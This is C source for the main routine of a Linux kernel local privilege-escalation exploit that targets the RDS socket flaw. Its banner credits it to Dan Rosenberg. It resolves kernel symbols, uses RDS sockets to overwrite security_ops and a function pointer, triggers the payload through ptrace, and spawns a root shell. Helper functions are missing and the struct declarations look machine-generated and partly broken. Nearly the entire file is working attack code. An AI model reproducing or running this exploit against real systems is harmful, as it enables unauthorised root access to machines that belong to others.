
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct utsname {int release; } ;
typedef scalar_t__ _prepare_kernel_cred ;
typedef scalar_t__ _commit_creds ;


 int PTRACE_TRACEME ;
 int RECVPORT ;
 int SENDPORT ;
 scalar_t__ commit_creds ;
 int execl (char*,char*,int *) ;
 unsigned long get_kernel_sym (char*) ;
 int getroot ;
 scalar_t__ getuid () ;
 int prep_sock (int ) ;
 scalar_t__ prepare_kernel_cred ;
 int printf (char*) ;
 int ptrace (int ,int,int *,int *) ;
 scalar_t__ strncmp (int ,char*,int) ;
 int uname (struct utsname*) ;
 int write_to_mem (unsigned long,unsigned long,int,int) ;

int main(int argc, char * argv[])
{
 unsigned long sec_ops, def_ops, cap_ptrace, target;
 int sendsock, recvsock;
 struct utsname ver;

 printf("[*] Linux kernel >= 2.6.30 RDS socket exploit\n");
 printf("[*] by Dan Rosenberg\n");

 uname(&ver);

 if(strncmp(ver.release, "2.6.3", 5)) {
  printf("[*] Your kernel is not vulnerable.\n");
  return -1;
 }


 printf("[*] Resolving kernel addresses...\n");
 sec_ops = get_kernel_sym("security_ops");
 def_ops = get_kernel_sym("default_security_ops");
 cap_ptrace = get_kernel_sym("cap_ptrace_traceme");
 commit_creds = (_commit_creds) get_kernel_sym("commit_creds");
 prepare_kernel_cred = (_prepare_kernel_cred) get_kernel_sym("prepare_kernel_cred");

 if(!sec_ops || !def_ops || !cap_ptrace || !commit_creds || !prepare_kernel_cred) {
  printf("[*] Failed to resolve kernel symbols.\n");
  return -1;
 }


 target = def_ops + sizeof(void *) + ((11 + sizeof(void *)) & ~(sizeof(void *) - 1));

 sendsock = prep_sock(SENDPORT);
 recvsock = prep_sock(RECVPORT);


 printf("[*] Overwriting security ops...\n");
 write_to_mem(sec_ops, def_ops, sendsock, recvsock);


 printf("[*] Overwriting function pointer...\n");
 write_to_mem(target, (unsigned long)&getroot, sendsock, recvsock);


 printf("[*] Triggering payload...\n");
 ptrace(PTRACE_TRACEME, 1, ((void*)0), ((void*)0));


 printf("[*] Restoring function pointer...\n");
 write_to_mem(target, cap_ptrace, sendsock, recvsock);

 if(getuid()) {
  printf("[*] Exploit failed to get root.\n");
  return -1;
 }

 printf("[*] Got root!\n");
 execl("/bin/sh", "sh", ((void*)0));

}
